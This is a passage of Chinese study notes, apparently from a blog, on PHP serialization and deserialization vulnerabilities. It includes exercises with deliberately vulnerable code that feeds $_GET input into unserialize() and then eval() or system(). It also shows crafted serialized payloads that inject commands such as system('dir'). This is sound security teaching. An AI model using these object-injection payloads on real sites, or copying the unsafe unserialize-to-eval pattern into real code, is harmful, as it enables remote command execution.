class="variable">$shengao</span>=<span class="string">&#x27;165&#x27;</span>;<span class="comment">//外部不可用</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"><span class="variable">$var1</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$var1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cyj</span>= <span class="keyword">new</span> <span class="title function_ invoke__">hero</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cyj</span>-&gt;name.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cyj</span>-&gt;sex.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cyj</span>-&gt;shengao.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hero</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span>  <span class="variable">$name</span>=<span class="string">&#x27;chengyaojin&#x27;</span>;</span><br><span class="line">  <span class="keyword">private</span>  <span class="variable">$sex</span>=<span class="string">&#x27;man&#x27;</span>;</span><br><span class="line">  <span class="keyword">protected</span>  <span class="variable">$shengao</span>=<span class="string">&#x27;165&#x27;</span>;<span class="comment">//子类可用</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"><span class="variable">$var1</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$var1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hero2</span> <span class="keyword">extends</span> <span class="title">hero</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;name.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;sex.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;shengao.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cyj</span>= <span class="keyword">new</span> <span class="title function_ invoke__">hero</span>();</span><br><span class="line"><span class="variable">$cyj2</span>=<span class="keyword">new</span> <span class="title function_ invoke__">hero2</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cyj</span>-&gt;name.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cyj2</span>-&gt;<span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240418233609469.png" alt="image-20240418233609469"></p><h1 id="序列化知识"><a href="#序列化知识" class="headerlink" title="序列化知识"></a>序列化知识</h1><h2 id="序列化的作用"><a href="#序列化的作用" class="headerlink" title="序列化的作用"></a>序列化的作用</h2><p>序列化 (Serialization)是将对象的状态信息(属性)转换为可以存储或传输的形式的过程。将对象或者数组转化为可储存&#x2F;传输的字符串。</p><p>演示:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TEST</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data2</span> = <span class="string">&quot;dazzhuang&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pass</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$pass</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data = <span class="variable">$data</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pass = <span class="variable">$pass</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$number</span> = <span class="number">34</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;user&#x27;</span>;</span><br><span class="line"><span class="variable">$bool</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$null</span> = <span class="literal">NULL</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span> =&gt; <span class="number">10</span>, <span class="string">&#x27;b&#x27;</span> =&gt; <span class="number">200</span>);</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title function_ invoke__">TEST</span>(<span class="string">&#x27;uu&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$test2</span> = <span class="keyword">new</span> <span class="title function_ invoke__">TEST</span>(<span class="string">&#x27;uu&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="variable">$test2</span>-&gt;data = &amp;<span class="variable">$test2</span>-&gt;data2;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$number</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$str</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$bool</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$null</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$test2</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240418234413114.png" alt="image-20240418234413114"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240418234703813.png" alt="image-20240418234703813"></p><h2 id="数组序列化"><a href="#数组序列化" class="headerlink" title="数组序列化"></a>数组序列化</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="string">&#x27;benben&#x27;</span>,<span class="string">&#x27;dazhuang&#x27;</span>,<span class="string">&#x27;laoliu&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421150039939.png" alt="image-20240421150039939"></p><h2 id="对象序列化"><a href="#对象序列化" class="headerlink" title="对象序列化"></a>对象序列化</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pub</span>=<span class="string">&#x27;benben&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pub;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421150229394.png" alt="image-20240421150229394"></p><h2 id="私有修饰符"><a href="#私有修饰符" class="headerlink" title="私有修饰符"></a>私有修饰符</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$pub</span>=<span class="string">&#x27;benben&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pub;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>私有属性会在当前类加上类名，再加上%00，也就是null</strong></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421150636424.png" alt="image-20240421150636424"></p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421150726683.png" alt="image-20240421150726683"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">url编码：O%3A4%3A%22test%22%3A1%3A%7Bs%3A9%3A%22%00test%00pub%22%3Bs%3A6%3A%22benben%22%3B%7D</span><br></pre></td></tr></table></figure><h2 id="保护修饰符"><a href="#保护修饰符" class="headerlink" title="保护修饰符"></a>保护修饰符</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$pub</span>=<span class="string">&#x27;benben&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pub;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421151744954.png" alt="image-20240421151744954"></p><p>会多个星号，然后前后都有null，提交的时候要加%00*%00</p><h2 id="成员属性调用对象"><a href="#成员属性调用对象" class="headerlink" title="成员属性调用对象"></a>成员属性调用对象</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$pub</span>=<span class="string">&#x27;benben&#x27;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">jineng</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;pub;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test2</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$ben</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ben=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test2</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421151924120.png" alt="image-20240421151924120"></p><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>1.反序列化之后的内容为一个对象;</p><p>2.反席列化生成的对象里的值，由反序列化里的值提供;与原有类预定义的值无关;</p><p>反序列化漏洞的成因:反序列化过程中，unserialize()接收的值(字符串)可控，得到所需要的代码，即生成的对象的属性值。通过更改这个值(字符串)，</p><p>3.反序列化不触发类的成员方法;需要调用方法后才能触发;</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$a</span> = <span class="string">&#x27;benben&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span>  <span class="variable">$b</span> = <span class="number">666</span>;</span><br><span class="line">    <span class="keyword">private</span>  <span class="variable">$c</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayVar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$d</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$d</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$d</span>).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">urlencode</span>(<span class="variable">$d</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">urldecode</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421152439469.png" alt="image-20240421152439469"></p><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;echo &quot;this is test!!&quot;;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayVar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$get</span> = <span class="variable">$_GET</span>[<span class="string">&quot;benben&quot;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$get</span>);</span><br><span class="line"><span class="variable">$b</span>-&gt;<span class="title function_ invoke__">displayVar</span>() ;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;echo &quot;this is test!!&quot;;&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayVar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421161340530.png" alt="image-20240421161340530"></p><p>如果是要执行命令的话，比如ipconfig，可以利用以下代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span> = <span class="string">&#x27;system(&quot;ipconfig&quot;);&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">displayVar</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">test</span>());</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421161552271.png" alt="image-20240421161552271"></p><h2 id="魔术方法介绍，构造和析构"><a href="#魔术方法介绍，构造和析构" class="headerlink" title="魔术方法介绍，构造和析构"></a><strong>魔术方法介绍，构造和析构</strong></h2><p><strong>魔术方法</strong>：一个预定义好的，在特定情况下自动触发的行为方法。</p><p><strong>魔术方法的作用</strong>：</p><p>反序列化漏洞的成因:</p><p>反序列化过程中，unserialize()接收的值(字符串)可控;通过更改这个值(字符串)，得到所需要的代码，通过调用方法，触发代码执行。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421162047664.png" alt="image-20240421162047664"></p><p>先思考触发时机，再思考功能，再想会不会传参数，然后得出返回值</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421162221153.png" alt="image-20240421162221153"></p><h3 id="construct-、destruct-类的构建和析构函数"><a href="#construct-、destruct-类的构建和析构函数" class="headerlink" title="construct()、destruct 类的构建和析构函数"></a>construct()、destruct 类的构建和析构函数</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发了构造函数1次&quot;</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;benben&quot;</span>);</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421162514691.png" alt="image-20240421162514691"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)#在对象的所有引用被删除或者当对象被显式销毁时执行的魔术方法，在反序列化过程中会触发</span>;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;触发了析构函数1次&quot;</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;benben&quot;</span>);</span><br><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421162659320.png" alt="image-20240421162659320"></p><p><strong>例题</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$cmd</span> = <span class="string">&quot;echo &#x27;dazhuang666!!&#x27;;&quot;</span> ;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span> (<span class="variable language_">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ser</span> = <span class="variable">$_GET</span>[<span class="string">&quot;benben&quot;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>构造，让cmd&#x3D;我们想要的指令就行</p><p>O:4:”User”:1:{s:3:”cmd”;s:14:”system(‘dir’);”;}</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421165300585.png" alt="image-20240421165300585"></p><h3 id="weakup-、sleep方法"><a href="#weakup-、sleep方法" class="headerlink" title="weakup()、sleep方法"></a>weakup()、sleep方法</h3><p><strong>__sleep()</strong></p><p>**序列化serialize()**函数会检査类中是否存在一个魔术方法_ seep()。</p><p>如果存在，该方法会先被调用，然后才执行序列化操作。</p><p>此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。</p><p>如果该方法未返回任何内容，则 NULL被序列化，并产生一个ENOTICE级别的错误。</p><p>触发时机:序列化serialize()之前</p><p>功能:对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。</p><p>参数:成员属性</p><p>返回值:需要被序列化存储的成员属性</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;nickname&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421170502700.png" alt="image-20240421170502700"></p><p>可以发现password没有了，这是因为序列化调用了sleep，只返回了这两个值，我们把sleep注释掉看看结果。</p><p><img src="C:\Users\yxz\AppData\Roaming\Typora\typora-user-images\image-20240421182315566.png" alt="image-20240421182315566"></p><p>可以啊看到就有password了，且因为是private，前面还加上了类名和null</p><p><strong>例题</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">SITE</span> = <span class="string">&#x27;uusama&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$nickname</span>, <span class="variable">$password</span></span>)    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="variable">$nickname</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__sleep</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;benben&#x27;</span>];</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="variable">$cmd</span>, <span class="string">&#x27;b&#x27;</span>, <span 